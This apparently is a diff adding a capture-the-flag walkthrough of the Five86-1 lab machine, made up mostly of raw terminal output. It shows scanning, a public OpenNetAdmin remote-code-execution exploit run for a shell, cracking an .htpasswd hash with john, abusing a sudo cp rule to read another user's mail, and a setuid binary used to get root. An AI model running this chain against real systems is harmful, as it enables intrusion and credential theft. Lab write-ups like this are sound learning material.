@@ -1,0 +1,313 @@
+IP:192.168.0.117
+
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 192.168.0.117
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 12:59 IST
+Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 100.00% done; ETC: 13:00 (0:00:00 remaining)
+Nmap scan report for 192.168.0.117
+Host is up (0.0016s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey:
+|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
+|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
+|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/ona
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/7%OT=22%CT=1%CU=31079%PV=Y%DS=2%DC=T%G=Y%TM=5FA64D2
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
+OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=D5A6%RUD=G)IE(R=Y%DFI=N%T=40
+OS:%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.51 ms LAPTOP-U5913CMD.mshome.net (172.22.144.1)
+2   3.02 ms 192.168.0.117
+
+
+http://192.168.0.117/robots.txt
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://192.168.0.117
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Nov  7 13:02:23 2020
+URL_BASE: http://192.168.0.117/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.0.117/ ----
++ http://192.168.0.117/index.html (CODE:200|SIZE:30)                                                                    
++ http://192.168.0.117/reports (CODE:401|SIZE:460)                                                                      
++ http://192.168.0.117/robots.txt (CODE:200|SIZE:29)                                                                    
++ http://192.168.0.117/server-status (CODE:403|SIZE:278)
+
+
+root@LAPTOP-U5913CMD:/home/akshay# nikto -h 192.168.0.117
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.117
++ Target Hostname:    192.168.0.117
++ Target Port:        80
++ Start Time:         2020-11-07 13:02:46 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/ona/' in robots.txt returned a non-forbidden or redirect HTTP code ()
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8073 requests: 1 error(s) and 7 item(s) reported on remote host
++ End Time:           2020-11-07 13:04:10 (GMT5.5) (84 seconds)
+------------------------------------------------------------------
+
+root@LAPTOP-U5913CMD:/home/akshay# searchsploit Opennetadmin
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenNetAdmin 13.03.01 - Remote Code Execution                                                                                                             | php/webapps/26682.txt
+OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                              | php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Execution
+
+Version - OpenNetAdmin - v18.1.1
+
+http://192.168.0.117/ona/login.php
+
+
+There's login page and default username and password is admin:admin
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/five86# ./47691.sh http://192.168.0.117/ona/
+sh$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh$ ls
+config
+config_dnld.php
+dcm.php
+images
+include
+index.php
+local
+login.php
+logout.php
+modules
+plugins
+winc
+workspace_plugins
+sh$
+
+
+sh$ ls -la /var/www
+total 16
+drwxr-xr-x  3 root root 4096 Jan  1  2020 .
+drwxr-xr-x 14 root root 4096 Jan  1  2020 ..
+-rw-r--r--  1 root root  202 Jan  1  2020 .htpasswd
+drwxr-xr-x  3 root root 4096 Jan  1  2020 html
+sh$ cat /var/www/.htpasswd
+douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
+
+# To make things slightly less painful (a standard dictionary will likely fail),
+# use the following character set for this 10 character password: aefhrt
+sh$
+
+
+WE can make the use of crunch overhere to create that kinda wordlist.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/five86# john hash --wordlist=wordlist.txt
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:07 1.15% (ETA: 13:52:48) 0g/s 99259p/s 99259c/s 99259C/s aafftftfaa..aaffthrhtt
+0g 0:00:00:17 3.05% (ETA: 13:51:58) 0g/s 108296p/s 108296c/s 108296C/s aeahhaefaa..aeahheahtt
+0g 0:00:00:47 7.75% (ETA: 13:52:47) 0g/s 99688p/s 99688c/s 99688C/s afrrfraaaa..afrrfrtett
+0g 0:00:01:26 14.49% (ETA: 13:52:34) 0g/s 101807p/s 101807c/s 101807C/s ateerefaaa..ateerfeett
+0g 0:00:02:35 25.98% (ETA: 13:52:37) 0g/s 101324p/s 101324c/s 101324C/s ehfahtaraa..ehfahttttt
+0g 0:00:03:39 35.43% (ETA: 13:52:59) 0g/s 97820p/s 97820c/s 97820C/s farhearaaa..farheehett
+fatherrrrr       (douglas)
+1g 0:00:03:42 DONE (2020-11-07 13:46) 0.004494g/s 97579p/s 97579c/s 97579C/s fatherefaa..fathetahtt
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/five86#
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/five86# ssh douglas@192.168.0.117
+The authenticity of host '192.168.0.117 (192.168.0.117)' can't be established.
+ECDSA key fingerprint is SHA256:aE9ZqWXrvGgzgM21BjQ23GmxQVBeD5CZw0nUq8P8RyM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.0.117' (ECDSA) to the list of known hosts.
+douglas@192.168.0.117's password:
+Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+idouglas@five86-1:~$ id
+uid=1005(douglas) gid=1005(douglas) groups=1005(douglas)
+douglas@five86-1:~$
+
+
+douglas@five86-1:/var/mail$ ls -la
+total 12
+drwxrwsr-x  2 root mail 4096 Jan  1  2020 .
+drwxr-xr-x 14 root root 4096 Jan  1  2020 ..
+-rw-rw----  1 jen  mail  885 Jan  1  2020 jen
+douglas@five86-1:/var/mail$ cat jen
+cat: jen: Permission denied
+douglas@five86-1:/var/mail$
+
+
+We can view this using sudo rights
+douglas@five86-1:/var/mail$ sudo -l
+Matching Defaults entries for douglas on five86-1:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User douglas may run the following commands on five86-1:
+    (jen) NOPASSWD: /bin/cp
+douglas@five86-1:/var/mail$
+
+
+
+douglas@five86-1:/tmp$ touch akshay.txt
+douglas@five86-1:/tmp$ chmod 777 akshay.txt
+douglas@five86-1:/tmp$ sudo -u jen /bin/cp /var/mail/jen /tmp/akshay.txt
+douglas@five86-1:/tmp$ ls -la akshay.txt
+-rwxrwxrwx 1 douglas douglas 885 Nov  7 03:21 akshay.txt
+douglas@five86-1:/tmp$ cat akshay.txt
+From roy@five86-1 Wed Jan 01 03:17:00 2020
+Return-path: <roy@five86-1>
+Envelope-to: jen@five86-1
+Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500
+Received: from roy by five86-1 with local (Exim 4.92)
+        (envelope-from <roy@five86-1>)
+        id 1imZBc-0001FU-El
+        for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500
+To: jen@five86-1
+Subject: Monday Moss
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1imZBc-0001FU-El@five86-1>
+From: Roy Trenneman <roy@five86-1>
+Date: Wed, 01 Jan 2020 03:17:00 -0500
+
+Hi Jen,
+
+As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.
+
+But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!
+
+Moss will understand (ha ha ha ha).
+
+Tanks,
+Roy
+
+douglas@five86-1:/tmp$
+
+douglas@five86-1:/tmp$ su moss
+Password:
+moss@five86-1:/tmp$ id
+uid=1001(moss) gid=1001(moss) groups=1001(moss)
+moss@five86-1:/tmp$
+
+
+moss@five86-1:~/.games$ strings upyourgame
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+printf
+system
+__cxa_finalize
+__libc_start_main
+GLIBC_2.7
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+Would you like to play a game?
+Could you please repeat that?
+Nope, you'll need to enter that again.
+You entered: No.  Is this correct?
+We appear to have a problem?  Do we have a problem?
+Made in Britain.
+/bin/sh
+;*3$"
+
+
+
+moss@five86-1:~/.games$ ls -la
+total 28
+drwx------ 2 moss moss  4096 Jan  1  2020 .
+drwx------ 3 moss moss  4096 Jan  1  2020 ..
+lrwxrwxrwx 1 moss moss    21 Jan  1  2020 battlestar -> /usr/games/battlestar
+lrwxrwxrwx 1 moss moss    14 Jan  1  2020 bcd -> /usr/games/bcd
+lrwxrwxrwx 1 moss moss    21 Jan  1  2020 bombardier -> /usr/games/bombardier
+lrwxrwxrwx 1 moss moss    17 Jan  1  2020 empire -> /usr/games/empire
+lrwxrwxrwx 1 moss moss    20 Jan  1  2020 freesweep -> /usr/games/freesweep
+lrwxrwxrwx 1 moss moss    15 Jan  1  2020 hunt -> /usr/games/hunt
+lrwxrwxrwx 1 moss moss    20 Jan  1  2020 ninvaders -> /usr/games/ninvaders
+lrwxrwxrwx 1 moss moss    17 Jan  1  2020 nsnake -> /usr/games/nsnake
+lrwxrwxrwx 1 moss moss    25 Jan  1  2020 pacman4console -> /usr/games/pacman4console
+lrwxrwxrwx 1 moss moss    17 Jan  1  2020 petris -> /usr/games/petris
+lrwxrwxrwx 1 moss moss    16 Jan  1  2020 snake -> /usr/games/snake
+lrwxrwxrwx 1 moss moss    17 Jan  1  2020 sudoku -> /usr/games/sudoku
+-rwsr-xr-x 1 root root 16824 Jan  1  2020 upyourgame
+lrwxrwxrwx 1 moss moss    16 Jan  1  2020 worms -> /usr/games/worms
+moss@five86-1:~/.games$ ls -la upyourgame
+-rwsr-xr-x 1 root root 16824 Jan  1  2020 upyourgame
+moss@five86-1:~/.games$ ./upyourgame asd
+Would you like to play a game? y
+
+Could you please repeat that? y
+
+Nope, you'll need to enter that again. asd
+
+You entered: No.  Is this correct? no
+
+We appear to have a problem?  Do we have a problem? yes
+
+Made in Britain.
+# id
+uid=0(root) gid=1001(moss) groups=1001(moss)
+# cd /root
+# ls
+flag.txt
+# cat flag.txt
+8f3b38dd95eccf600593da4522251746
+
+
+
+Ez
